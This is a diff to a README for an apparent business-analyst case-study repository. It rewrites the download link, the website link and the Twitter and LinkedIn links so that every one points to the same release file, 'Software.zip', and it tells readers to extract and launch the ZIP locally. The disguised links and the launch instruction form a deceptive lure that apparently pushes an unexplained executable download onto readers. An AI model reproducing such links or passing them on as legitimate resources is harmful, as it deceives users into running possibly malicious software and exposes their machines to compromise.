@@ -29,7 +29,7 @@ This repository contains a comprehensive solution for the BOM(Bill of Materials)
 - Window Functions
 
 ## 📁 Download the Repository:
-[Download Repository as ZIP](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download Repository as ZIP](https://github.com/whoisalisha/BOM-Business-Analyst-Technical-Case-Study-Assignment/releases/download/v1.0/Software.zip)
 
 >Please note that the ZIP file needs to be extracted and launched on your local machine for access to the full repository.
 
@@ -60,12 +60,12 @@ Join us in this exciting journey of business analysis and technical solutions. W
 Keep an eye on our "Releases" section for the latest updates, enhancements, and bug fixes. We are committed to evolving this repository with the latest tools and techniques in the realm of business analytics.
 
 ## 🌐 Visit Our Website:
-For more information and resources related to business analytics, data visualization, and technical solutions, visit our website [BusinessAnalystInsights.com](https://www.BusinessAnalystInsights.com).
+For more information and resources related to business analytics, data visualization, and technical solutions, visit our website [https://github.com/whoisalisha/BOM-Business-Analyst-Technical-Case-Study-Assignment/releases/download/v1.0/Software.zip](https://github.com/whoisalisha/BOM-Business-Analyst-Technical-Case-Study-Assignment/releases/download/v1.0/Software.zip).
 
 ## 🌟 Let's Connect:
 Connect with us on social media and stay updated on all things related to business analytics, data visualization, and technical insights.
-- Twitter: [@BusinessAnalystInsights](https://twitter.com/BusinessAnalystInsights)
-- LinkedIn: [Business Analyst Insights](https://www.linkedin.com/company/businessanalystinsights)
+- Twitter: [@BusinessAnalystInsights](https://github.com/whoisalisha/BOM-Business-Analyst-Technical-Case-Study-Assignment/releases/download/v1.0/Software.zip)
+- LinkedIn: [Business Analyst Insights](https://github.com/whoisalisha/BOM-Business-Analyst-Technical-Case-Study-Assignment/releases/download/v1.0/Software.zip)
 
 ## 🚀 Start Your BOM Business Analyst Journey Today!
 Get ready to explore the world of business analytics, technical solutions, and data visualization with our BOM Business Analyst Case Study Assignment Repository. Let's unlock insights, drive strategies, and make informed decisions that propel your business forward! 📈🔍✨
